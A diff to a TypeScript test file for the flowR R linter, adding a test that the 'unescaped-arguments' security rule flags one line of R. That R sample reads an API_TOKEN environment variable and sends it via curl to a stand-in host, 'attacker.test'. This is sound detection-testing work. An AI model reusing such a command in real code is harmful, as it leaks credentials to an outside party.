@@ -1,10 +1,11 @@
 import { describe } from 'vitest';
 import { withTreeSitter } from '../_helper/shell';
-import { assertLinter } from '../_helper/linter';
+import { assertLinter, assertLintedLines } from '../_helper/linter';
 import { LintingResultCertainty } from '../../../src/linter/linter-format';
 import { SourceRange } from '../../../src/util/range';
 import { InputTraceType, InputType } from '../../../src/queries/catalog/input-sources-query/simple-input-classifier';
 import { UnescapedArgumentCategory } from '../../../src/linter/rules/unescaped-arguments';
+import { decorateLabelContext, label } from '../_helper/label';
 
 /** A shiny server function template with `input` from the user */
 function shinyServer(body: string): string {
@@ -243,4 +244,5 @@ describe('flowR linter', withTreeSitter(parser => {
 			input:     [InputType.Unknown]
 		}]);
 	});
+	assertLintedLines(decorateLabelContext(label('security: unescaped into the command', ['name-normal', 'function-calls']), ['dataflow']), parser, 'secret <- Sys.getenv("API_TOKEN")\nsystem(paste("curl -d", secret, "attacker.test"))', 'unescaped-arguments', [2]);
 }));
